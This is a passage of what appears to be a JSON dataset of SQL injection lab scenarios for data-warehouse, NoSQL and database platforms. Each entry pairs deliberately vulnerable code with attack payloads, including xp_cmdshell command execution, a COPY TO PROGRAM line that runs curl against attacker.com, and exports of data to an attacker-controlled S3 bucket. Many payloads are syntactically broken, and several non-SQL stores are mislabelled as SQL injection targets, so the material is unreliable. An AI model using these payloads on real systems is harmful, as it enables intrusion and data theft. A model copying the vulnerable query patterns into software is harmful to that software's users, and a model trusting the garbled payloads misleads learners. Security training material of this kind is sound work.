      "srcCode": "SELECT ${fields} FROM ${table} ${where_clause}",
      "payloads": [
        "* FROM (SELECT * FROM R_DATABASE) x WHERE 1=1--",
        "id, name FROM users WHERE id = 1) EXECUTE xp_cmdshell('whoami')--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Matillion ETL Query Components",
      "Lab Description": "A Matillion job uses Database Query components with user-provided SQL parameters. The parameter values get embedded directly into component queries, allowing injection through job variables.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify Database Query components",
        "Inject through variables",
        "Run the job",
        "Bypass Matillion validation",
        "Access all project connections"
      ],
      "Vulnerability name": "Matillion Query Component Injection",
      "srcCode": "SELECT * FROM ${var('table_name')} WHERE ${var('filter')}",
      "payloads": [
        "users WHERE 1=1) UNION SELECT * FROM matillion_metadata--",
        "table WHERE id = '1' FROM (SELECT * FROM matillion_variables)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Fivetran Connector Configuration",
      "Lab Description": "A Fivetran connector uses user-provided parameters in SQL queries during schema detection. The configuration values get concatenated directly into information schema queries, allowing injection through connector setup.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify connector configuration",
        "Inject through setup parameters",
        "Trigger schema refresh",
        "Bypass Fivetran validation",
        "Compromise all synced data"
      ],
      "Vulnerability name": "Fivetran Connector Injection",
      "srcCode": "SELECT * FROM information_schema.columns \nWHERE table_schema = '${config.schema}' \nAND table_name = '${config.table}'",
      "payloads": [
        "public' AND 1=0) UNION SELECT * FROM pg_user--",
        "legit' FROM (SELECT * FROM information_schema.tables) x--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Stitch Data Source SQL",
      "Lab Description": "A Stitch integration uses user-provided SQL for data extraction. The query parameters get concatenated directly into replication queries, allowing injection through integration settings.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify data source configuration",
        "Inject through replication SQL",
        "Trigger data sync",
        "Bypass Stitch validation",
        "Access all connected destinations"
      ],
      "Vulnerability name": "Stitch Data Source Injection",
      "srcCode": "SELECT ${fields} FROM ${table} WHERE ${incremental_key} > '${last_value}'",
      "payloads": [
        "* FROM (SELECT * FROM all_tables) x WHERE 1=1--",
        "id, name FROM users WHERE id = 1) UNION SELECT * FROM stitch_connections--"
      ]
    },


    
      {
        "Lab scenario": "SQL Injection in MongoDB $where Clause",
        "Lab Description": "A Node.js application uses user input directly in MongoDB's $where operator, which allows JavaScript evaluation. Attackers can break out of the query context and execute arbitrary JavaScript.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify endpoints using $where operator",
          "Craft JavaScript payload in query parameters",
          "Bypass input filters using Unicode escaping",
          "Execute system commands through JavaScript",
          "Exfiltrate data through error messages"
        ],
        "Vulnerability name": "MongoDB JS Injection",
        "srcCode": "db.users.find({ $where: function() { return this.username == '${userInput}' } })",
        "payloads": [
          "' || this.password == 'secret",
          "' || (function(){ return db.getCollectionNames() })() || '"
        ]
      },
      {
        "Lab scenario": "SQL Injection in DynamoDB Filter Expression",
        "Lab Description": "An AWS Lambda function builds DynamoDB filter expressions by concatenating user input. The expression evaluation allows breaking out into underlying SQL-like syntax.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify DynamoDB scan/query endpoints",
          "Inject through filter expression parameters",
          "Bypass DynamoDB attribute validation",
          "Access unauthorized tables",
          "Exfiltrate data through expression errors"
        ],
        "Vulnerability name": "DynamoDB Expression Injection",
        "srcCode": "const params = {\n  TableName: 'Users',\n  FilterExpression: 'username = ' + userInput\n};",
        "payloads": [
          "'admin' OR begins_with(password, 'a')",
          "'test' AND attribute_exists(SSN)"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Cassandra CQL Prepared Statement Bypass",
        "Lab Description": "A Java application uses string concatenation for Cassandra CQL query parts before preparing statements, allowing injection through crafted parameters.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify non-parameterized CQL fragments",
          "Inject through WHERE clause parameters",
          "Bypass prepared statement protection",
          "Execute arbitrary CQL commands",
          "Access system keyspaces"
        ],
        "Vulnerability name": "Cassandra CQL Injection",
        "srcCode": "String query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\nPreparedStatement ps = session.prepare(query);",
        "payloads": [
          "' ALLOW FILTERING",
          "admin' AND password='secret' ALLOW FILTERING"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Azure Cosmos DB SQL API",
        "Lab Description": "A .NET application builds Cosmos DB SQL queries by concatenating user input, allowing injection through crafted WHERE clauses.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify Cosmos DB SQL API endpoints",
          "Inject through query predicates",
          "Bypass parameterized query validation",
          "Access unauthorized collections",
          "Exfiltrate data through JOIN clauses"
        ],
        "Vulnerability name": "Cosmos DB SQL Injection",
        "srcCode": "var query = new QueryDefinition(\n  \"SELECT * FROM c WHERE c.username = '\" + username + \"'\"\n);",
        "payloads": [
          "' OR c.isAdmin = true",
          "test' JOIN p IN c.permissions WHERE p.level = 'admin'"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Google Firestore REST API",
        "Lab Description": "A Firebase application uses user input directly in Firestore REST API filter parameters, allowing injection through crafted field paths.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify Firestore REST endpoints",
          "Inject through structuredQuery parameters",
          "Bypass Firestore security rules",
          "Access unauthorized documents",
          "Modify data through batch operations"
        ],
        "Vulnerability name": "Firestore REST Injection",
        "srcCode": "{ \"structuredQuery\": { \"where\": { \"fieldFilter\": { \"field\": { \"fieldPath\": \"username\" }, \"op\": \"EQUAL\", \"value\": { \"stringValue\": \"\" + userInput + \"\" } } } } }",
        "payloads": [
          "\"\\\" OR \\\"1\\\"=\\\"1\"",
          "admin\" }, { \"fieldPath\": \"password\" }] }"
        ]
      },
      {
        "Lab scenario": "SQL Injection in ArangoDB AQL Query",
        "Lab Description": "A JavaScript application builds ArangoDB AQL queries by concatenating user input, allowing injection through crafted FILTER clauses.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify AQL query endpoints",
          "Inject through FILTER conditions",
          "Bypass bind parameter validation",
          "Access system collections",
          "Execute JavaScript functions"
        ],
        "Vulnerability name": "ArangoDB AQL Injection",
        "srcCode": "const query = aql`FOR doc IN users FILTER doc.username == '${userInput}' RETURN doc`;",
        "payloads": [
          "' OR doc.isAdmin == true",
          "test' || doc.password != '' RETURN doc"
        ]
      },
      {
        "Lab scenario": "SQL Injection in CouchDB Mango Query",
        "Lab Description": "A Python application builds CouchDB Mango queries by concatenating user input in selector expressions, allowing injection through crafted JSON.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify Mango query endpoints",
          "Inject through selector parameters",
          "Bypass JSON validation",
          "Access system databases",
          "Execute admin functions"
        ],
        "Vulnerability name": "CouchDB Mango Injection",
        "srcCode": "selector = {\"username\": {\"$eq\": \"${userInput}\"}}",
        "payloads": [
          "\"}}, {\"password\": {\"$exists\": true}",
          "admin\"}, \"$or\": [{\"roles\": \"admin\"}]}"
        ]
      },
      {
        "Lab scenario": "SQL Injection in InfluxDB CLI Command",
        "Lab Description": "A bash script builds InfluxDB CLI commands by concatenating user input, allowing injection through crafted query parameters.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify Influx CLI execution points",
          "Inject through query parameters",
          "Bypass command line escaping",
          "Access internal measurements",
          "Execute system commands"
        ],
        "Vulnerability name": "Influx CLI Injection",
        "srcCode": "influx -execute 'SELECT * FROM \"metrics\" WHERE \"host\" = \\''\"$userInput\"'\\''",
        "payloads": [
          "' OR 1=1--",
          "localhost' FROM \"_internal\"..\"database\"--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Neo4j Cypher Shell",
        "Lab Description": "A Java application builds Neo4j Cypher queries by concatenating user input in shell commands, allowing injection through crafted node properties.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify Cypher shell execution points",
          "Inject through node property filters",
          "Bypass shell escaping",
          "Execute system procedures",
          "Dump entire graph"
        ],
        "Vulnerability name": "Neo4j Shell Injection",
        "srcCode": "Runtime.getRuntime().exec(\"cypher-shell -u neo4j -p password 'MATCH (n:User) WHERE n.username = \\\"\" + username + \"\\\" RETURN n'\");",
        "payloads": [
          "\" OR 1=1 RETURN n",
          "admin\" WITH n CALL dbms.procedures() YIELD name RETURN name--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Amazon Redshift UNLOAD Command",
        "Lab Description": "A data pipeline builds Redshift UNLOAD commands with user-provided S3 paths, allowing injection through crafted credentials strings.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify UNLOAD command execution points",
          "Inject through S3 path parameters",
          "Bypass IAM role validation",
          "Exfiltrate data to attacker-controlled buckets",
          "Execute remote commands"
        ],
        "Vulnerability name": "Redshift UNLOAD Injection",
        "srcCode": "UNLOAD ('SELECT * FROM users') TO '${s3Path}'\nCREDENTIALS 'aws_access_key_id=${key};aws_secret_access_key=${secret}'",          
        "payloads": [
          "s3://attacker-bucket/ WITH (FORMAT CSV)) COPY users TO 's3://attacker-bucket/leak'--",
          "s3://legit-bucket/' CREDENTIALS 'aws_access_key_id=AKIA...') GRANT ALL TO attacker--"
        ]
      },



      
      
          {
            "Lab scenario": "SQL Injection in PostgreSQL FDW (Foreign Data Wrapper) OPTIONS Clause",
            "Lab Description": "A multi-database system dynamically creates PostgreSQL foreign data wrappers with user-controlled OPTIONS parameters. The OPTIONS string is concatenated directly into the FDW creation query without proper escaping, allowing attackers to break out of the wrapper configuration context and execute arbitrary SQL commands when the foreign server is accessed. This is particularly dangerous as it can compromise linked database systems.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify FDW creation endpoints in application code",
              "Craft malicious OPTIONS string containing SQL payload",
              "Bypass FDW syntax validation using comment sequences",
              "Trigger foreign table access to execute payload",
              "Pivot attack through database links to connected systems"
            ],
            "Vulnerability name": "PostgreSQL FDW OPTIONS Injection",
            "srcCode": "CREATE SERVER foreign_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host '\" + userHost + \"', dbname '\" + userDb + \"')",
            "payloads": [
              "localhost', dbname 'test')) RETURNS TABLE(cmd text) AS $$ BEGIN RETURN QUERY EXECUTE 'COPY (SELECT * FROM passwords) TO PROGRAM ''curl attacker.com'''; END; $$ LANGUAGE plpgsql--",
              "attacker.com', port '5432', dbname 'legit_db' options 'connect_timeout=30'"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Snowflake External Function HEADERS Parameter",
            "Lab Description": "A Snowflake data pipeline uses external functions that pass HTTP headers directly into SQL queries during result processing. The header values are concatenated without proper sanitization when building the function's metadata queries, allowing injection through crafted API gateway requests. This vulnerability is particularly dangerous as it bypasses Snowflake's normal parameterized query protections.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify external functions using HEADERS parameter",
              "Intercept and modify HTTP requests to the API gateway",
              "Craft malicious header values containing SQL payload",
              "Bypass Snowflake's header validation mechanisms",
              "Exfiltrate data through function result processing"
            ],
            "Vulnerability name": "Snowflake External Function Header Injection",
            "srcCode": "CREATE EXTERNAL FUNCTION process_data(data STRING) RETURNS STRING HEADERS = {'user-id': '\" + userId + \"'} API_INTEGRATION = api_int AS 'https://api.example.com/process'",
            "payloads": [
              "' FROM (SELECT * FROM information_schema.tables)--",
              "1'); SELECT system$whitelist()--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Azure Cosmos DB Stored Procedure Context",
            "Lab Description": "An Azure Cosmos DB application uses JavaScript stored procedures that dynamically build SQL queries with user-provided input from the procedure's context object. The input is concatenated directly into the query text without proper sanitization, allowing attackers to break out of the stored procedure's execution context and access unauthorized collections. This vulnerability is particularly dangerous in multi-tenant Cosmos DB implementations.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify stored procedure execution endpoints",
              "Craft malicious input in the context object",
              "Bypass Cosmos DB's JavaScript sandbox restrictions",
              "Access system collections through query chaining",
              "Exfiltrate data via JOIN clauses across collections"
            ],
            "Vulnerability name": "Cosmos DB Stored Procedure Injection",
            "srcCode": "function queryDocuments(context) { var query = 'SELECT * FROM c WHERE c.type = \\'' + context.getInput() + '\\''; context.getCollection().queryDocuments(collectionLink, query, callback); }",
            "payloads": [
              "' OR c._ts > 0--",
              "test' JOIN t IN c.tags WHERE t.name = 'admin'--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Google BigQuery Scripting Variables",
            "Lab Description": "A BigQuery data pipeline uses scripting variables that are interpolated directly into dynamic SQL statements without proper escaping. The variables are set from user-controlled input and used in subsequent query steps, allowing attackers to break out of the variable context and execute arbitrary commands. This vulnerability is particularly dangerous in scheduled BigQuery scripts that process sensitive data.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify scripting variable declaration points",
              "Inject through variable assignment parameters",
              "Bypass BigQuery's script validation checks",
              "Chain multiple statements using semicolons",
              "Access INFORMATION_SCHEMA datasets"
            ],
            "Vulnerability name": "BigQuery Scripting Variable Injection",
            "srcCode": "DECLARE filter STRING DEFAULT '\" + userInput + \"'; EXECUTE IMMEDIATE 'SELECT * FROM dataset.table WHERE column = ''' || filter || '''';",
            "payloads": [
              "' OR 1=1--",
              "test' UNION ALL SELECT * FROM `region-us`.INFORMATION_SCHEMA.TABLES--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Snowflake Time Travel Queries",
            "Lab Description": "A data recovery system builds Snowflake time travel queries with user-controlled timestamp parameters. The timestamps are concatenated directly into AT/ BEFORE clauses without proper validation, allowing attackers to modify query behavior and access historical data beyond their privileges. This vulnerability is particularly dangerous in compliance scenarios where time travel is used for auditing.",
            "Difficulty Level": "Medium",
            "Solution Steps": [
              "Identify time travel query endpoints",
              "Inject through timestamp parameters",
              "Bypass time format validation",
              "Access deleted records from other schemas",
              "Recover sensitive data from table versions"
            ],
            "Vulnerability name": "Snowflake Time Travel Injection",
            "srcCode": "SELECT * FROM table AT(TIMESTAMP => '\" + userTimestamp + \"'::timestamp_ltz)",
            "payloads": [
              "2023-01-01 00:00:00'::timestamp_ltz) UNION SELECT * FROM information_schema.tables--",
              "current_timestamp() - interval '1 day') FROM (SELECT * FROM table_changes) x--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Databricks Notebook Widget Parameters",
            "Lab Description": "A Databricks notebook uses SQL widgets that accept user input which is then interpolated directly into Spark SQL queries without proper parameterization. The widget values are concatenated into the query text, allowing attackers to break out of the intended query structure. This vulnerability is particularly dangerous in shared notebook environments where multiple users have execution access.",
            "Difficulty Level": "Medium",
            "Solution Steps": [
              "Identify notebook widgets accepting SQL parameters",
              "Inject through widget input values",
              "Bypass Databricks parameter validation",
              "Execute commands in Spark context",
              "Access metastore tables through UNION queries"
            ],
            "Vulnerability name": "Databricks Widget Injection",
            "srcCode": "dbutils.widgets.text(\"input\", \"default\"); val query = s\"SELECT * FROM table WHERE column = '${dbutils.widgets.get(\"input\")}'\"; spark.sql(query)",
            "payloads": [
              "' UNION SELECT * FROM hive_metastore.default.secrets--",
              "test' FROM (SELECT explode(array(1,2,3)))--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Trino Dynamic Catalog Configuration",
            "Lab Description": "A Trino cluster allows dynamic catalog configuration through user-provided properties. The properties are concatenated directly into catalog initialization queries without proper escaping, allowing attackers to modify catalog behavior and access unauthorized data sources. This vulnerability is particularly dangerous in multi-catalog environments.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify catalog creation endpoints",
              "Inject through connector properties",
              "Trigger catalog refresh operations",
              "Bypass Trino security checks",
              "Compromise multiple connected data sources"
            ],
            "Vulnerability name": "Trino Catalog Configuration Injection",
            "srcCode": "CREATE CATALOG my_catalog WITH (connector.name = 'postgresql', connection-url = 'jdbc:postgresql://\" + userHost + \":5432/\" + userDb + \"')",
            "payloads": [
              "localhost/legit?ssl=true&user=postgres')) FROM (SELECT * FROM system.metadata.catalogs)--",
              "attacker.com/test?user=postgres&password=hack' FROM (SELECT 1) x) OR 1=1--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in ClickHouse External Dictionary Source",
            "Lab Description": "A ClickHouse cluster configures external dictionaries with user-provided source queries. The queries are concatenated directly into dictionary loading logic without proper sanitization, allowing attackers to modify dictionary behavior and access system tables. This vulnerability is particularly dangerous when dictionaries are configured to refresh automatically.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify external dictionary definitions",
              "Inject through source query parameters",
              "Trigger dictionary reload operations",
              "Bypass ClickHouse access controls",
              "Compromise dictionary contents"
            ],
            "Vulnerability name": "ClickHouse Dictionary Source Injection",
            "srcCode": "CREATE DICTIONARY my_dict (source = POSTGRESQL(query = 'SELECT * FROM \"\" + userTable + \"\"'))",
            "payloads": [
              "users WHERE 1=0) UNION SELECT * FROM system.processes--",
              "legit_table' FROM (SELECT * FROM merge_tree_settings) FORMAT CSV--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Druid SQL Query CONTEXT Parameters",
            "Lab Description": "A Druid cluster processes SQL queries with user-provided context parameters that are interpolated directly into native Druid queries. The parameters are used to modify query execution behavior and are concatenated without proper sanitization, allowing attackers to bypass Druid's SQL layer and execute native queries directly.",
            "Difficulty Level": "Medium",
            "Solution Steps": [
              "Identify query context parameters",
              "Inject through context values",
              "Bypass Druid SQL validation",
              "Execute native Druid queries",
              "Access system tables through context manipulation"
            ],
            "Vulnerability name": "Druid Context Parameter Injection",
            "srcCode": "{\"query\":\"SELECT * FROM datasource\",\"context\":{\"\" + paramName + \"\":\"\" + paramValue + \"\"}}",
            "payloads": [
              "\"sqlTimeZone\":\"UTC' FROM (SELECT * FROM sys.segments) x--\"",
              "\"maxScatterGatherBytes\":\"1000000\"},{\"malicious\":\"' UNION SELECT * FROM sys.servers--\""
            ]
          },
          {
            "Lab scenario": "SQL Injection in Hive Metastore PARTITION Clause",
            "Lab Description": "A Hive metastore service processes partition filters with user-provided expressions that are concatenated directly into metastore queries. The expressions are not properly sanitized, allowing attackers to bypass partition pruning restrictions and access unauthorized data partitions. This vulnerability is particularly dangerous in multi-tenant Hive implementations.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify partition filter endpoints",
              "Inject through partition expressions",
              "Bypass Hive query validation",
              "Access unauthorized partitions",
              "Exfiltrate metadata through filter injection"
            ],
            "Vulnerability name": "Hive Metastore Partition Injection",
            "srcCode": "SHOW PARTITIONS table PARTITION(\" + userFilter + \")",
            "payloads": [
              "dt='2023-01-01') FROM (SELECT * FROM PARTITIONS) x--",
              "category='books' OR (SELECT 1 FROM TBLS) IS NOT NULL--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Impala Admission Control QUERY_CONDITION",
            "Lab Description": "An Impala cluster processes admission control rules with user-provided conditions that are concatenated directly into policy evaluation queries. The conditions are not properly sanitized, allowing attackers to modify query prioritization and resource allocation. This vulnerability is particularly dangerous in shared Impala clusters with resource constraints.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify admission control endpoints",
              "Inject through rule conditions",
              "Bypass Impala validation checks",
              "Modify query prioritization",
              "Exfiltrate data through resource metrics"
            ],
            "Vulnerability name": "Impala Admission Control Injection",
            "srcCode": "CREATE POOL my_pool WITH ALLOCATION = 0.5 WITH QUERY_CONDITION = '\" + userCondition + \"'",
            "payloads": [
              "user = 'admin' FROM (SELECT * FROM functional.alltypes) x--",
              "memory > 1000) RETURNING *--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Presto Session Property Values",
            "Lab Description": "A Presto cluster accepts session properties that modify query execution behavior. The property values are concatenated directly into system queries without proper sanitization, allowing attackers to modify query plans and access unauthorized information. This vulnerability is particularly dangerous when session properties are set from user-controlled sources.",
            "Difficulty Level": "Medium",
            "Solution Steps": [
              "Identify session property endpoints",
              "Inject through property values",
              "Bypass property validation",
              "Modify query execution plans",
              "Exfiltrate data through session changes"
            ],
            "Vulnerability name": "Presto Session Property Injection",
            "srcCode": "SET SESSION optimize_hash_generation = '\" + userValue + \"'",
            "payloads": [
              "true' FROM (SELECT * FROM system.metadata.tables)--",
              "false'); INSERT INTO system.runtime.queries VALUES ('malicious')--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Filters",
            "Lab Description": "A CockroachDB changefeed sends data to webhooks with user-provided filter expressions that are concatenated directly into CDC queries. The filters are not properly sanitized, allowing attackers to modify changefeed behavior and access unauthorized data. This vulnerability is particularly dangerous in multi-tenant CockroachDB deployments.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify changefeed creation endpoints",
              "Inject through filter parameters",
              "Trigger changefeed events",
              "Bypass CDC validation",
              "Exfiltrate data through webhook payloads"
            ],
            "Vulnerability name": "CockroachDB CDC Filter Injection",
            "srcCode": "CREATE CHANGEFEED FOR TABLE users INTO 'webhook-https://callback.example.com' WITH filter = '\" + userFilter + \"'",
            "payloads": [
              "SELECT * FROM users WHERE type = 'admin'--",
              "SELECT *, (SELECT version()) FROM users--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension URLs",
            "Lab Description": "A data analysis tool uses DuckDB's HTTPFS extension with user-provided URLs that are concatenated directly into remote file access queries. The URLs are not properly sanitized, allowing attackers to break out of the file access context and execute arbitrary SQL commands. This vulnerability is particularly dangerous when accessing untrusted remote data sources.",
            "Difficulty Level": "Medium",
            "Solution Steps": [
              "Identify HTTPFS extension usage",
              "Inject through URL parameters",
              "Bypass file extension validation",
              "Execute remote commands",
              "Exfiltrate data through HTTP requests"
            ],
            "Vulnerability name": "DuckDB HTTPFS URL Injection",
            "srcCode": "SELECT * FROM read_csv('\" + userUrl + \"')",
            "payloads": [
              "http://attacker.com/payload') FROM (SELECT * FROM sqlite_master)--",
              "/tmp/test.csv' WITH (HEADER true)) RETURNING *--"
            ]
          },
          {
            "Lab scenario": "SQL Injection in Materialized View REFRESH OPTIONS",
            "Lab Description": "A data warehouse allows setting refresh options for materialized views with user-provided values that are concatenated directly into refresh queries. The options are not properly sanitized, allowing attackers to modify refresh behavior and execute arbitrary commands during view maintenance operations. This vulnerability is particularly dangerous in automated refresh scenarios.",
            "Difficulty Level": "Hard",
            "Solution Steps": [
              "Identify materialized view refresh endpoints",
              "Inject through refresh options",
              "Trigger view refresh operations",
              "Bypass view dependency checks",
              "Execute commands during refresh"
            ],
            "Vulnerability name": "Materialized View Refresh Injection",
            "srcCode": "ALTER MATERIALIZED VIEW user_stats SET REFRESH OPTIONS (\" + userOptions + \")",
            "payloads": [
              "\"async\"='true') FROM (SELECT * FROM pg_matviews) x--",
              "\"concurrently\"='true'); COPY (SELECT * FROM secrets) TO '/tmp/leak'--"
            ]
          },


          
      
              {
                "Lab scenario": "SQL Injection in Oracle SDO_GEOMETRY Constructor",
                "Lab Description": "A GIS application builds Oracle spatial queries using unsanitized user input in SDO_GEOMETRY constructors. The WKT (Well-Known Text) parameters are concatenated directly into spatial queries, allowing injection through crafted geometry definitions that break out of the spatial function context.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify SDO_GEOMETRY usage in queries",
                  "Craft malicious WKT containing SQL payload",
                  "Bypass Oracle spatial validation",
                  "Access non-spatial tables via UNION",
                  "Exfiltrate data through error messages"
                ],
                "Vulnerability name": "Oracle Spatial Injection",
                "srcCode": "SELECT * FROM buildings WHERE SDO_RELATE(geometry, SDO_GEOMETRY('\" + userWkt + \"', 4326)) = 'TRUE'",
                "payloads": [
                  "POINT(0 0)', 4326)) = 'TRUE' OR 1=1--",
                  "POLYGON((0 0,1 0,1 1,0 1,0 0))') FROM (SELECT * FROM all_tables) x--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in SQL Server HierarchyId Parse()",
                "Lab Description": "A hierarchical data application uses unsanitized input in SQL Server's HierarchyId.Parse() function. The string representation of hierarchy paths is concatenated directly into queries, allowing injection through crafted path strings that break out of the hierarchy context.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify HierarchyId.Parse() usage",
                  "Craft malicious path strings",
                  "Bypass hierarchy validation",
                  "Access system tables via error-based injection",
                  "Traverse unauthorized hierarchy branches"
                ],
                "Vulnerability name": "SQL Server HierarchyId Injection",
                "srcCode": "SELECT * FROM org_chart WHERE node = hierarchyid::Parse('\" + userPath + \"')",
                "payloads": [
                  "/1/') OR 1=1--",
                  "/1/2/3/') FROM (SELECT * FROM sys.objects) x--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in PostgreSQL JSONB Path Queries",
                "Lab Description": "A document store application builds PostgreSQL JSONB path queries with unsanitized user input. The path expressions are concatenated directly into jsonb_path_query functions, allowing injection through crafted JSON path strings that break out of the document context.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify jsonb_path_query usage",
                  "Craft malicious JSON path expressions",
                  "Bypass JSON path validation",
                  "Access relational tables via type coercion",
                  "Exfiltrate data through JSON aggregation"
                ],
                "Vulnerability name": "PostgreSQL JSONB Path Injection",
                "srcCode": "SELECT jsonb_path_query(document, '\" + userPath + \"') FROM docs",
                "payloads": [
                  "$.* ? (@.id == 1) RETURNING VARCHAR DEFAULT (SELECT version()) ON ERROR",
                  "lax $[*] ? (1=1)) columns (x varchar) as (select * from pg_user)--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in MySQL Generated Columns",
                "Lab Description": "A schema-migration tool dynamically creates MySQL generated columns using unsanitized input in the generation expression. The expressions are concatenated directly into ALTER TABLE statements, allowing injection during column creation that persists in the schema.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify generated column creation",
                  "Inject through column expression",
                  "Bypass expression validation",
                  "Persist malicious logic in schema",
                  "Trigger expression evaluation"
                ],
                "Vulnerability name": "MySQL Generated Column Injection",
                "srcCode": "ALTER TABLE users ADD COLUMN hash VARCHAR(64) GENERATED ALWAYS AS (\" + userExpr + \") STORED",
                "payloads": [
                  "MD5(CONCAT(password,'salt')) FROM (SELECT * FROM mysql.user) x--",
                  "LEFT(username,1)) WHERE 1=0 UNION SELECT 1,2,3--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in SQL Server Graph MATCH Clauses",
                "Lab Description": "A graph analytics application builds SQL Server graph queries with unsanitized input in MATCH clauses. The node/edge patterns are concatenated directly into queries, allowing injection through crafted graph patterns that break out of the graph context.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify MATCH clause usage",
                  "Craft malicious graph patterns",
                  "Bypass graph syntax validation",
                  "Access non-graph tables via UNION",
                  "Traverse unauthorized graph paths"
                ],
                "Vulnerability name": "SQL Server Graph MATCH Injection",
                "srcCode": "SELECT * FROM MATCH('\" + userPattern + \"')",
                "payloads": [
                  "(n:User)-[r]->(m) WHERE n.name = 'admin' OR 1=1--",
                  "(n)-[r]->(m)) FROM (SELECT * FROM sys.tables) x--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Snowflake Stored Procedure Dynamic SQL",
                "Lab Description": "A Snowflake data pipeline uses JavaScript stored procedures that build dynamic SQL with unsanitized input. The input is concatenated directly into execute immediate statements, allowing injection through crafted strings that bypass Snowflake's normal parameterization protections.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify stored procedure calls",
                  "Inject through procedure arguments",
                  "Bypass JavaScript sandbox restrictions",
                  "Execute arbitrary Snowflake SQL",
                  "Access account usage views"
                ],
                "Vulnerability name": "Snowflake Stored Procedure Injection",
                "srcCode": "var query = 'SELECT * FROM table WHERE col = \\'' + INPUT + '\\''; snowflake.execute({sqlText: query});",
                "payloads": [
                  "' UNION SELECT * FROM information_schema.tables--",
                  "' || (SELECT current_role()) || '"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Google BigQuery Scripting Control Structures",
                "Lab Description": "A BigQuery scripting workflow uses unsanitized input in IF/CASE control structures that are interpolated into dynamic SQL. The conditions are concatenated directly into script logic, allowing injection through crafted boolean expressions that modify control flow.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify scripting control structures",
                  "Inject through conditional expressions",
                  "Bypass script validation",
                  "Modify query execution path",
                  "Access unauthorized datasets"
                ],
                "Vulnerability name": "BigQuery Scripting Control Injection",
                "srcCode": "IF '\" + userCondition + \"' THEN SELECT * FROM table1; ELSE SELECT * FROM table2; END IF;",
                "payloads": [
                  "1=1 THEN SELECT * FROM sensitive_data--",
                  "EXISTS(SELECT * FROM region-us.INFORMATION_SCHEMA.SCHEMATA) THEN SELECT 1--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Azure Synapse Serverless OPENROWSET",
                "Lab Description": "A Synapse analytics pipeline uses OPENROWSET with unsanitized input for file paths or format options. The parameters are concatenated directly into external table queries, allowing injection through crafted file specifications that break out of the data loading context.",
                "Difficulty Level": "Hard",
                "Solution Steps": [
                  "Identify OPENROWSET usage",
                  "Inject through file path/format parameters",
                  "Bypass external table validation",
                  "Access system views via UNION",
                  "Exfiltrate data through file operations"
                ],
                "Vulnerability name": "Synapse OPENROWSET Injection",
                "srcCode": "SELECT * FROM OPENROWSET(BULK '\" + userPath + \"', FORMAT = '\" + userFormat + \"')",
                "payloads": [
                  "C:\\legit.csv') WITH (FORMAT='CSV') UNION SELECT * FROM sys.sql_logins--",
                  "https://attacker.com/payload') AS [\" + (SELECT name FROM sys.tables) + \"]--"
                ]
              },
              {
                "Lab scenario": "SQL Injection in Databricks Delta Lake Time Travel",
                "Lab Description": "A Databricks notebook uses Delta Lake time travel with unsanitized version/timestamp parameters. The values are concatenated directly into table version queries, allowing injection through crafted time specifications that access unauthorized data versions.",
                "Difficulty Level": "Medium",
                "Solution Steps": [
                  "Identify time travel queries",
                  "Inject through version/timestamp parameters",
                  "Bypass time format validation",
                  "Access historical data versions",
                  "Recover deleted records"
                ],
                "Vulnerability name": "Delta Lake Time Travel Injection",
